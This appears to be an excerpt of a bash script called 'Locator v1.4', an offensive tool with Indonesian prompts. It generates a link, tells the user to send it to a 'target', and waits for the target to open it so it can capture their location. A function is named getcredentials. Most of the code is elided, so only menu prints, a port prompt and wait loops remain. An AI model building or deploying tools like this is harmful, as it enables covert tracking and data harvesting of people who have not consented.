#!/bin/bash
# Locator v1.4
# Coded by: Mryans|94Ns (You dont become a coder by just changing the credits)
...
getcredentials() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Menunggu lokasi ...\e[0m\n"
while [ true ]; do
...
printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Kasih link ini kepada target anda!:\e[0m\e[1;77m %s \n' $send_link
...
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Masukan port nya (Default:\e[0m\e[1;77m 55333 \e[0m\e[1;92m): \e[0m' $default_port
read port
...
printf "\e[1;92m[\e[0m*\e[1;92m] Kasih link kepada target:\e[0m\e[1;77m %s\e[0m\n" $link
checkfound
}
...
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Masukan Pilihan Anda: \e[0m\en' option_server
...
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Tunggu Target buka Tautan Nih Cuk ...\e[0m\n"
while [ true ]; do
...
printf "\n"
printf "\e[1;93m :::\e[0m\e[1;77m Coded by: @Mryans|94Ns\e[0m\n"
